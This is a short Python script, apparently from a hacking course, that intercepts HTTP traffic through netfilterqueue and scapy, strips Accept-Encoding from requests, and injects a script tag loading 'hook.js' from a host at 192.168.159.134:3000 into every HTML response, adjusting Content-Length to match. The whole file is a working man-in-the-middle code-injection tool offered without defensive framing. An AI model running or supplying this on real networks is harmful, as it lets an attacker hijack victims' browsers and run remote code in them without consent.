#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, payload):
    packet[scapy.Raw].load = payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8', errors='ignore'))
            # to search the content length value in request:

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load.decode('utf-8', errors='ignore'))
            # (?:....) to locate the regrex keywords
            injection_code = b'<script src="http://192.168.159.134:3000/hook.js"></script>'
            load = bytes(load.replace(b"<body>", b"<body>" + injection_code))
            if content_length_search and b"text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = str(int(content_length) + len(injection_code))
                load = load.replace(bytes(content_length, 'utf-8'), new_content_length.encode('utf-8'))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            pkt.set_payload(bytes(new_packet))

    pkt.accept()


def packet_show(pkt):
    print("[+] Printing Packets")
    scapy_pkt = scapy.IP(pkt.get_payload())
    print(scapy_pkt.show())


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
